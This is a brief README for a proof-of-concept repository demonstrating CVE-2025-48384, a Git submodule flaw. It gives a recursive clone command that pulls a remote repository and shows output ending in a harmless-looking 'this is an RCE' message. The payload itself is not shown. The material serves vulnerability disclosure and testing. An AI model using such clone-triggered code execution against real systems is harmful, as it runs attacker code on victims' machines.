# PoC for CVE-2025-48384

See [CVE-2025-48384](https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384)

To run:
```
git -c protocol.file.allow=always clone --recurse-submodules git@github.com:liamg/CVE-2025-48384.git
```

Example output:
```
git -c protocol.file.allow=always clone --recurse-submodules CVE-2025-48384 test
Cloning into 'test'...
done.
'ubmodule 'sub' (git@github.com:liamg/CVE-2025-48384-submodule.git) registered for path 'sub
'...ing into '/Users/liamg/test/sub
remote: Enumerating objects: 5, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 5 (delta 0), reused 5 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (5/5), done.
Uh-oh, this is an RCE!
```

